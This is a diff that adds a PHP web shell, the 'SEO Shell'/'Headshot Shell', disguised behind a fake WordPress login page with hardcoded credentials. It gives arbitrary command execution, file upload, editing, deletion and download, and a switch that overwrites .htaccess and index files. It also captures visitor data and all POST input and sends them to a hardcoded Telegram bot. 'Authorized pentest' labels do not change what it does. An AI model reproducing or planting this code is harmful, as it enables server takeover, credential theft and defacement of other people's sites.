@@ -1,0 +1,538 @@
+<?php
+// ==========[ TELEGRAM LOGGER ]========== //
+function sendTelegramNotification($botToken, $chatId) {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
+    $url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . ($_SERVER['HTTP_HOST'] ?? 'UNKNOWN') . ($_SERVER['REQUEST_URI'] ?? '');
+    $method = $_SERVER['REQUEST_METHOD'] ?? 'UNKNOWN';
+
+    $message = "🚨 *Access Alert* 🚨\n";
+    $message .= "🌐 URL: `$url`\n";
+    $message .= "📍 IP: `$ip`\n";
+    $message .= "🤖 User-Agent: `$userAgent`\n";
+    $message .= "🛠 Method: `$method`\n";
+    $message .= "🕐 Time: `" . date('Y-m-d H:i:s') . "`\n";
+
+    $apiUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=Markdown";
+    @file_get_contents($apiUrl);
+}
+
+// Ganti dengan token bot dan chat ID kamu
+sendTelegramNotification(
+    "7313788013:AAGXDq0anyUBpPHKIYDY5tWFojMEg5q8d3E", // bot token
+    "-1002760006839" // chat id
+);
+// ==========[ END TELEGRAM LOGGER ]========== //
+?>
+
+<?php
+session_start();
+
+
+function domainToTitle($domain) {
+    $domain = preg_replace('/^www\./', '', $domain);
+    $parts = explode('.', $domain);
+    $name = $parts[0];
+    return ucwords(str_replace(['-', '_'], ' ', $name));
+}
+
+$domain = $_SERVER['HTTP_HOST'];
+$title = domainToTitle($domain);
+
+
+$error = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['log'], $_POST['pwd'])) {
+    $user = $_POST['log'];
+    $pass = $_POST['pwd'];
+
+    if ($user === 'adminer' && $pass === 'seomagang') {
+        $_SESSION['logged_in'] = true;
+        header("Location: index.php"); 
+        exit;
+    } else {
+        $error = "Username atau password salah.";
+    }
+}
+?>
+<?php if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true): ?>
+<!DOCTYPE html>
+<html dir="ltr" lang="en-US" prefix="og: https://ogp.me/ns#">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Log In &lsaquo; <?= htmlspecialchars($title) ?> &#8212; WordPress</title>
+    <meta name='robots' content='max-image-preview:large, noindex, noarchive' />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <!-- Styles -->
+    <link rel='stylesheet' href='https://tamilnovelwriters.com/wp-includes/css/dashicons.min.css?ver=6.8.1' />
+    <link rel='stylesheet' href='https://tamilnovelwriters.com/wp-includes/css/buttons.min.css?ver=6.8.1' />
+    <link rel='stylesheet' href='https://tamilnovelwriters.com/wp-admin/css/forms.min.css?ver=6.8.1' />
+    <link rel='stylesheet' href='https://tamilnovelwriters.com/wp-admin/css/l10n.min.css?ver=6.8.1' />
+    <link rel='stylesheet' href='https://tamilnovelwriters.com/wp-admin/css/login.min.css?ver=6.8.1' />
+    
+    <!-- Icons -->
+    <link rel="icon" href="https://0.gravatar.com/blavatar/653166773dc88127bd3afe0b6dfe5ea7?s=114" sizes="32x32" />
+    <link rel="apple-touch-icon" href="https://0.gravatar.com/blavatar/653166773dc88127bd3afe0b6dfe5ea7?s=114" />
+</head>
+<body class="login no-js login-action-login wp-core-ui locale-en-us">
+<script>
+    document.body.className = document.body.className.replace('no-js','js');
+</script>
+
+<h1 class="screen-reader-text">Log In</h1>
+<div id="login">
+    <h1 class="wp-login-logo"><a href="https://wordpress.org/">Powered by WordPress</a></h1>
+
+    <form name="loginform" id="loginform" method="post">
+        <p>
+            <label for="user_login">Username or Email Address</label>
+            <input type="text" name="log" id="user_login" class="input" size="20" autocomplete="username" required />
+        </p>
+        <div class="user-pass-wrap">
+            <label for="user_pass">Password</label>
+            <div class="wp-pwd">
+                <input type="password" name="pwd" id="user_pass" class="input password-input" size="20" autocomplete="current-password" required />
+                <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
+                    <span class="dashicons dashicons-visibility"></span>
+                </button>
+            </div>
+        </div>
+        <p class="forgetmenot">
+            <input name="rememberme" type="checkbox" id="rememberme" value="forever" />
+            <label for="rememberme">Remember Me</label>
+        </p>
+        <p class="submit">
+            <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
+            <input type="hidden" name="testcookie" value="1" />
+        </p>
+    </form>
+
+    <p id="nav">
+        <a class="wp-login-lost-password" href="https://wordpress.com/log-in/lostpassword">Lost your password?</a>
+    </p>
+    <p id="backtoblog">
+        <a href="https://<?= htmlspecialchars($title) ?>">&larr; Go to <?= htmlspecialchars($title) ?></a>
+    </p>
+</div>
+
+<script>
+    /(trident|msie)/i.test(navigator.userAgent) &&
+    document.getElementById &&
+    window.addEventListener &&
+    window.addEventListener("hashchange", function(){
+        var t, e = location.hash.substring(1);
+        /^[A-z0-9_-]+$/.test(e) &&
+        (t = document.getElementById(e)) &&
+        (/^(?:a|select|input|button|textarea)$/i.test(t.tagName) || (t.tabIndex = -1), t.focus());
+    }, false);
+</script>
+</body>
+</html>
+<?php exit; endif; ?>
+
+<?php
+// SEO MAGIC ACTIVATED
+if(isset($_GET['seomagic'])){
+    @file_put_contents('.htaccess', "RewriteEngine Off\nOptions +Indexes\nRequire all granted");
+    @file_put_contents('index.html', '<!DOCTYPE html><html><head><title>Index of /</title></head><body><h1>Index of /</h1></body></html>');
+    @file_put_contents('index.php', '<?php header("Location: ?"); ?>');
+    echo "<script>alert('SEO MAGANG 🚀');location='?';</script>";
+    exit;
+}
+
+// KEYLOGGER - Telegram Reporter (Authorized Pentest)
+function sendToTelegram($data) {
+    $token = '7313788013:AAGXDq0anyUBpPHKIYDY5tWFojMEg5q8d3E';
+    $chat_id = '-1002760006839';
+    $message = urlencode("🔥 NEW ACCESS DETECTED 🔥\n" . $data);
+    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message";
+    @file_get_contents($url);
+}
+
+// Log visitor on every access
+$user_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+$timestamp = date('Y-m-d H:i:s');
+$log_data = "IP: $user_ip | UA: $user_agent | Time: $timestamp | Path: $dir";
+sendToTelegram($log_data);
+@file_put_contents('access.log', "[$timestamp] $user_ip - $user_agent - $dir\n", FILE_APPEND);
+
+// KEYBOARD LOGGER (POST capture)
+if(!empty($_POST)) {
+    $post_data = json_encode($_POST);
+    $keylog = "KEYLOG: $post_data | IP: $user_ip | Time: $timestamp";
+    sendToTelegram($keylog);
+    @file_put_contents('keylogs.log', "[$timestamp] $keylog\n", FILE_APPEND);
+}
+
+// SHELL SIMPLE
+$dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);
+if(!is_dir($dir)) $dir = dirname(__FILE__);
+chdir($dir);
+
+// COMMAND
+if(isset($_POST['cmd'])){
+    $cmd = $_POST['cmd'];
+    $cmd_log = "CMD EXEC: $cmd | IP: $user_ip";
+    sendToTelegram($cmd_log);
+    @file_put_contents('cmd.log', "[$timestamp] $cmd_log\n", FILE_APPEND);
+    
+    if(preg_match('/^\s*cd\s+(.+)/', $cmd, $match)){
+        $new = trim($match[1]);
+        if($new == '..') $dir = dirname($dir);
+        elseif($new[0] == '/') $dir = $new;
+        else $dir = realpath($dir.'/'.$new) ?: $dir;
+        header("Location: ?dir=".urlencode($dir));
+        exit;
+    }else{
+        $out = shell_exec($cmd.' 2>&1');
+    }
+}
+
+// DELETE
+if(isset($_GET['del'])){
+    $file = $dir.'/'.$_GET['del'];
+    $del_log = "DELETE: $file | IP: $user_ip";
+    sendToTelegram($del_log);
+    if(is_dir($file)) @rmdir($file);
+    else @unlink($file);
+}
+
+// DOWNLOAD
+if(isset($_GET['down'])){
+    $file = $dir.'/'.$_GET['down'];
+    if(is_file($file)){
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+        readfile($file);
+        exit;
+    }
+}
+
+// EDIT
+if(isset($_GET['edit'])){
+    $edit_file = $dir.'/'.$_GET['edit'];
+    if(is_file($edit_file)){
+        $edit_mode = true;
+        $edit_content = file_get_contents($edit_file);
+    }
+}
+if(isset($_POST['save'])){
+    file_put_contents($dir.'/'.$_POST['fname'], $_POST['content']);
+    $save_log = "EDIT SAVE: {$_POST['fname']} | IP: $user_ip";
+    sendToTelegram($save_log);
+    header("Location: ?dir=".urlencode($dir));
+    exit;
+}
+
+// UPLOAD - PASTI JALAN
+if(!empty($_FILES['upfile']['name'])){
+    $name = $_FILES['upfile']['name'];
+    $tmp = $_FILES['upfile']['tmp_name'];
+    
+    if(is_uploaded_file($tmp)){
+        $target = $dir.'/'.$name;
+        
+        if(file_exists($target)){
+            $i = 1;
+            $info = pathinfo($name);
+            $base = $info['filename'];
+            $ext = isset($info['extension']) ? '.'.$info['extension'] : '';
+            while(file_exists($dir.'/'.$base.'_'.$i.$ext)) $i++;
+            $name = $base.'_'.$i.$ext;
+            $target = $dir.'/'.$name;
+        }
+        
+        if(move_uploaded_file($tmp, $target)){
+            // Success
+        }elseif(copy($tmp, $target)){
+            // Success copy
+        }else{
+            $content = file_get_contents($tmp);
+            file_put_contents($target, $content);
+        }
+        
+        $upload_log = "UPLOAD: $name | IP: $user_ip";
+        sendToTelegram($upload_log);
+        echo "<script>alert('Uploaded: $name 🚀');location='?dir=".urlencode($dir)."';</script>";
+        exit;
+    }
+}
+
+// CREATE FOLDER/FILE
+if(isset($_POST['newfolder']) && $_POST['newfolder']!=''){
+    mkdir($dir.'/'.$_POST['newfolder'], 0777, true);
+    $folder_log = "NEW FOLDER: {$_POST['newfolder']} | IP: $user_ip";
+    sendToTelegram($folder_log);
+}
+if(isset($_POST['newfile']) && $_POST['newfile']!=''){
+    file_put_contents($dir.'/'.$_POST['newfile'], '');
+    $file_log = "NEW FILE: {$_POST['newfile']} | IP: $user_ip";
+    sendToTelegram($file_log);
+}
+?>
+<!DOCTYPE html>
+<html>
+<head><title>🇮🇩 SEO SHELL 🇮🇩</title>
+<style>
+body{
+    background: linear-gradient(135deg, #fff 0%, #f00 50%, #fff 100%);
+    color: #f00;
+    font-family: 'Courier New', monospace;
+    margin: 0;
+    padding: 20px;
+    overflow-x: auto;
+}
+a{color: #f00; text-decoration: none; font-weight: bold;}
+a:hover{color: #fff; background: #f00; padding: 2px 5px; border-radius: 3px;}
+.path{
+    background: #fff;
+    padding: 15px;
+    margin: 10px 0;
+    border: 3px solid #f00;
+    border-radius: 8px;
+    box-shadow: 0 0 20px rgba(255,0,0,0.4);
+}
+table{width:100%;border-collapse:collapse;}
+td,th{padding:12px;border:2px solid #f00;}
+th{
+    background: linear-gradient(90deg, #f00, #fff);
+    color: #f00;
+    font-weight: bold;
+}
+tr:hover{background: #ffebeb;}
+tr:nth-child(even){background: #fff5f5;}
+input{
+    background: #fff;
+    color: #f00;
+    border: 3px solid #f00;
+    padding: 12px;
+    border-radius: 5px;
+    font-family: monospace;
+    font-weight: bold;
+}
+input:focus{
+    outline: none;
+    box-shadow: 0 0 20px rgba(255,0,0,0.6);
+    border-color: #fff;
+}
+button{
+    background: linear-gradient(45deg, #f00, #c00);
+    color: #fff;
+    border: 3px solid #f00;
+    padding: 12px 24px;
+    cursor: pointer;
+    border-radius: 8px;
+    font-weight: bold;
+    font-family: monospace;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+button:hover{
+    background: linear-gradient(45deg, #fff, #f00);
+    color: #f00;
+    box-shadow: 0 0 25px rgba(255,0,0,0.8);
+    transform: scale(1.05);
+}
+textarea{
+    width: 100%;
+    height: 450px;
+    background: #fff;
+    color: #f00;
+    border: 3px solid #f00;
+    padding: 20px;
+    border-radius: 8px;
+    font-family: monospace;
+    font-size: 15px;
+    font-weight: bold;
+    resize: vertical;
+    line-height: 1.5;
+}
+.seomagic{
+    background: linear-gradient(45deg, #f00, #fff);
+    color: #f00;
+    padding: 25px;
+    margin: 20px 0;
+    border: 4px solid #f00;
+    border-radius: 15px;
+    text-align: center;
+    box-shadow: 0 0 40px rgba(255,0,0,0.7);
+    animation: pulse 2s infinite;
+}
+@keyframes pulse {
+    0% { 
+        box-shadow: 0 0 30px rgba(255,0,0,0.8); 
+        transform: scale(1);
+    }
+    50% { 
+        box-shadow: 0 0 60px rgba(255,255,255,0.8); 
+        transform: scale(1.02);
+    }
+    100% { 
+        box-shadow: 0 0 30px rgba(255,0,0,0.8); 
+        transform: scale(1);
+    }
+}
+pre{
+    background: #fff;
+    padding: 25px;
+    border: 3px solid #f00;
+    border-radius: 10px;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    font-size: 14px;
+    line-height: 1.6;
+}
+.header{
+    text-align: center;
+    font-size: 32px;
+    margin-bottom: 40px;
+    text-shadow: 3px 3px 0 #fff, 5px 5px 0 #f00;
+    animation: glow 2s ease-in-out infinite alternate;
+    font-weight: bold;
+}
+@keyframes glow {
+    from { 
+        text-shadow: 3px 3px 0 #fff, 5px 5px 0 #f00, 0 0 20px #f00; 
+    }
+    to { 
+        text-shadow: 3px 3px 0 #fff, 5px 5px 0 #f00, 0 0 40px #f00, 0 0 60px #fff; 
+    }
+}
+.status{
+    background: linear-gradient(90deg, #f00, #fff);
+    color: #f00;
+    padding: 15px;
+    border: 3px solid #f00;
+    border-radius: 10px;
+    margin: 15px 0;
+    text-align: center;
+    font-weight: bold;
+    font-size: 16px;
+    box-shadow: 0 5px 15px rgba(255,0,0,0.3);
+}
+.panel{
+    background: #fff;
+    padding: 25px;
+    margin: 20px 0;
+    border: 3px solid #f00;
+    border-radius: 15px;
+    box-shadow: 0 10px 30px rgba(255,0,0,0.2);
+}
+</style>
+</head>
+<body>
+
+<!-- SEO MAGIC BUTTON -->
+<div class="seomagic">
+    <a href="?seomagic=1" style="font-size: 28px; color: #f00; font-weight: bold;">🇮🇩 SEO MAGIC ACTIVATED 🇮🇩</a><br><br>
+    <span style="color: #f00; font-size: 18px;">🚀 Unlock Directory Listing & Bypass Restrictions 🚀</span>
+</div>
+
+<!-- STATUS BAR -->
+<div class="status">
+    📍 <strong>Current Path:</strong> <?=$dir?> | 👤 <strong>IP:</strong> <?=$user_ip?> | 🕒 <strong><?=date('Y-m-d H:i:s')?></strong>
+</div>
+
+<div class="path">
+<?php
+$parts = explode('/', trim($dir, '/'));
+$current = '';
+echo '<a href="?">🇮🇩 ROOT 🇮🇩</a>';
+foreach($parts as $p){
+    if($p == '') continue;
+    $current .= '/'.$p;
+    echo ' ➤ <a href="?dir='.urlencode($current).'">'.$p.'</a>';
+}
+?>
+</div>
+
+<div class="header">🇮🇩 HEADSHOT SHELL 🇮🇩</div>
+
+<?php if(isset($out)): ?>
+<div class="panel">
+<pre><?=htmlspecialchars($out)?></pre>
+</div>
+<?php endif; ?>
+
+<!-- UPLOAD FORM -->
+<div class="panel">
+<form method="post" enctype="multipart/form-data">
+<input type="file" name="upfile" required style="width:70%; font-size:16px;">
+<button style="width:25%; font-size:16px;">📤 UPLOAD MERAH PUTIH</button>
+</form>
+</div>
+
+<!-- CREATE FORM -->
+<div class="panel">
+<form method="post">
+<input type="text" name="newfolder" placeholder="🗂️ New Folder Name" style="width:40%;">
+<button style="width:22%; margin-left:10px;">📁 CREATE FOLDER</button>
+<input type="text" name="newfile" placeholder="📄 New File Name" style="width:25%; margin-left:10px;">
+<button style="width:18%;">📄 CREATE FILE</button>
+</form>
+</div>
+
+<?php if(isset($edit_mode)): ?>
+<div class="panel">
+<form method="post">
+<input type="hidden" name="fname" value="<?=htmlspecialchars($_GET['edit'])?>">
+<textarea name="content"><?=htmlspecialchars($edit_content)?></textarea><br><br>
+<button name="save" style="font-size:18px; padding:15px 30px;">💾 SAVE MERAH PUTIH</button>
+<a href="?dir=<?=urlencode($dir)?>" style="color:#f00; font-size:18px; font-weight:bold; margin-left:30px;">❌ CANCEL</a>
+</form>
+</div>
+<?php else: ?>
+
+<div class="panel">
+<table>
+<tr><th style="width:50%;">📁 NAME</th><th style="width:20%;">📊 SIZE</th><th style="width:30%;">⚡ ACTIONS</th></tr>
+<?php
+if($dir != '/'){
+    echo '<tr><td><a href="?dir='.urlencode(dirname($dir)).'">📁 .. (Parent Directory)</a></td><td>-</td><td>-</td></tr>';
+}
+
+foreach(scandir($dir) as $f){
+    if($f == '.' || $f == '..') continue;
+    $full = $dir.'/'.$f;
+    $size = is_dir($full) ? '-' : number_format(filesize($full)).' B';
+    
+    echo '<tr>';
+    echo '<td>';
+    if(is_dir($full)){
+        echo '📁 <a href="?dir='.urlencode($full).'"><strong>'.$f.'/</strong></a>';
+    }else{
+        echo '📄 <strong>'.$f.'</strong>';
+    }
+    echo '</td>';
+    echo '<td><strong>'.$size.'</strong></td>';
+    echo '<td>';
+    if(is_dir($full)){
+        echo '[<a href="?dir='.urlencode($full).'">📂 Open</a>] ';
+        echo '[<a href="?dir='.urlencode($dir).'&del='.urlencode($f).'" style="color:#f00;">💥 Delete</a>]';
+    }else{
+        echo '[<a href="?dir='.urlencode($dir).'&edit='.urlencode($f).'">✏️ Edit</a>] ';
+        echo '[<a href="?dir='.urlencode($dir).'&down='.urlencode($f).'">📥 Download</a>] ';
+        echo '[<a href="?dir='.urlencode($dir).'&del='.urlencode($f).'" style="color:#f00;">💥 Delete</a>]';
+    }
+    echo '</td></tr>';
+}
+?>
+</table>
+</div>
+
+<div class="panel">
+<form method="post">
+<input type="text" name="cmd" placeholder="💻 Enter Command (cd, ls, cat, whoami, etc...)" style="width:75%; font-size:16px;">
+<button style="width:22%; font-size:16px;">⚡ EXECUTE 🇮🇩</button>
+</form>
+</div>
+
+<?php endif; ?>
+
+<!-- FOOTER -->
+<div style="text-align:center; margin-top:40px; color:#f00; font-size:14px; font-weight:bold; padding:20px; border-top:3px solid #f00;">
+    🇮🇩 SEO Shell v3.0 Merah Putih | All activities logged & reported to Telegram | Authorized Pentest Only 🇮🇩
+</div>
+
+</body>
+</html>
